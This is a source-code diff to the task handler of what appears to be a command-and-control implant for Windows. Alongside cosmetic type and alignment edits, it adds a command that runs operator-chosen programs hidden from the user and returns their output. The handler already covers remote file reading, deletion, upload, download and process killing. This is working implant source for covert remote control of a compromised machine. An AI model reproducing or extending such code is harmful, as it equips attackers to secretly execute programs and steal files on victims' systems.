@@ -55,6 +55,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_PS_KILL:
 			this->CmdPsKill(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_PS_RUN:
+			this->CmdPsRun(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_PWD:       
 			this->CmdPwd(CommandId, inPacker, outPacker); break;
 
@@ -80,8 +83,8 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG pathSize = 0;
-	CHAR* path = (CHAR*)inPacker->UnpackBytes(&pathSize);
-	ULONG taskId = inPacker->Unpack32();
+	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
+	ULONG taskId   = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
 
@@ -101,7 +104,7 @@ void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	DWORD readed = 0;
 	PVOID content = MemAllocLocal(contentSize);
 
-	bool result = ApiWin->ReadFile(hFile, content, contentSize, &readed, NULL);
+	BOOL result = ApiWin->ReadFile(hFile, content, contentSize, &readed, NULL);
 	if (result) {
 		outPacker->Pack32(commandId);
 		outPacker->PackBytes((PBYTE)path, pathSize);
@@ -165,6 +168,7 @@ void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
 void Commander::CmdDisks(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG taskId = inPacker->Unpack32();
+
 	outPacker->Pack32(taskId);
 	outPacker->Pack32(commandId);
 
@@ -234,7 +238,7 @@ void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outP
 	ULONG fileId   = inPacker->Unpack32();
 	ULONG taskId   = inPacker->Unpack32();
 
-	bool  found    = false;
+	BOOL  found    = false;
 	for (int i = 0; i < this->agent->downloader->downloads.size(); i++) {
 		if (this->agent->downloader->downloads[i].fileId == fileId) {
 			this->agent->downloader->downloads[i].state = newState;
@@ -330,8 +334,8 @@ void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 void Commander::CmdMkdir(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG pathSize = 0;
-	CHAR* path = (CHAR*)inPacker->UnpackBytes(&pathSize);
-	ULONG taskId = inPacker->Unpack32();
+	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
+	ULONG taskId   = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
 
@@ -349,10 +353,10 @@ void Commander::CmdMkdir(ULONG commandId, Packer* inPacker, Packer* outPacker)
 void Commander::CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG srcSize = 0;
-	CHAR* src = (CHAR*)inPacker->UnpackBytes(&srcSize);
+	CHAR* src     = (CHAR*)inPacker->UnpackBytes(&srcSize);
 	ULONG dstSize = 0;
-	CHAR* dst = (CHAR*)inPacker->UnpackBytes(&dstSize);
-	ULONG taskId = inPacker->Unpack32();
+	CHAR* dst     = (CHAR*)inPacker->UnpackBytes(&dstSize);
+	ULONG taskId  = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
 
@@ -527,7 +531,7 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
-	ULONG64 pid = inPacker->Unpack32();
+	ULONG64 pid  = inPacker->Unpack32();
 	ULONG taskId = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
@@ -556,6 +560,69 @@ void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 }
 
+void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	BOOL  progOutput   = inPacker->Unpack8();
+	BOOL  progState    = inPacker->Unpack32();
+	ULONG progSize     = 0;
+	CHAR* prog         = (CHAR*)inPacker->UnpackBytes(&progSize);
+	ULONG progArgsSize = 0;
+	CHAR* progArgs     = (CHAR*)inPacker->UnpackBytes(&progArgsSize);
+	ULONG taskId       = inPacker->Unpack32();
+
+	PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFOA spi = { 0 };
+	spi.cb          = sizeof(STARTUPINFOA);
+	spi.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+	spi.wShowWindow = SW_HIDE;
+
+
+	HANDLE pipeRead  = NULL;
+	HANDLE pipeWrite = NULL;
+	if (progOutput) {
+		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+		ApiWin->CreatePipe(&pipeRead, &pipeWrite, &sa, 0);
+
+		spi.hStdError  = pipeWrite;
+		spi.hStdOutput = pipeWrite;
+		spi.hStdInput  = pipeRead;
+	}
+
+	BOOL result = ApiWin->CreateProcessA(prog, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+
+	if (result) {
+		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(commandId);
+		outPacker->Pack32(job.pidObject);
+		outPacker->Pack8(progOutput);
+		outPacker->PackBytes((PBYTE)prog, progSize);
+
+		ApiNt->NtClose(pi.hThread);
+		pi.hThread = NULL;
+		if (!progOutput) {
+			ApiNt->NtClose(pi.hProcess);
+			pi.hProcess = NULL;
+		}
+	}
+	else {
+		if (pipeRead) {
+			ApiNt->NtClose(pipeRead);
+			pipeRead = NULL;
+		}
+
+		if (pipeWrite) {
+			ApiNt->NtClose(pipeWrite);
+			pipeWrite = NULL;
+		}
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+	}
+}
+
 void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	CHAR  path[MAX_PATH] = { 0 };
@@ -577,15 +644,15 @@ void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
 void Commander::CmdRm(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG pathSize = 0;
-	CHAR* path = (CHAR*)inPacker->UnpackBytes(&pathSize);
-	ULONG taskId = inPacker->Unpack32();
+	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
+	ULONG taskId   = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
 
 	DWORD dwAttrib = ApiWin->GetFileAttributesA(path);
 
-	bool result = FALSE;
-	bool directory = (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
+	BOOL result = FALSE;
+	BOOL directory = (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
 
 	if ( directory )
 		result = ApiWin->RemoveDirectoryA(path);
@@ -624,7 +691,7 @@ void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	MemoryData memData = agent->memorysaver->chunks[memoryId];
 	if (memData.complete) {
 
-		bool  result  = false;
+		BOOL  result  = false;
 		DWORD written = 0;
 
 		HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
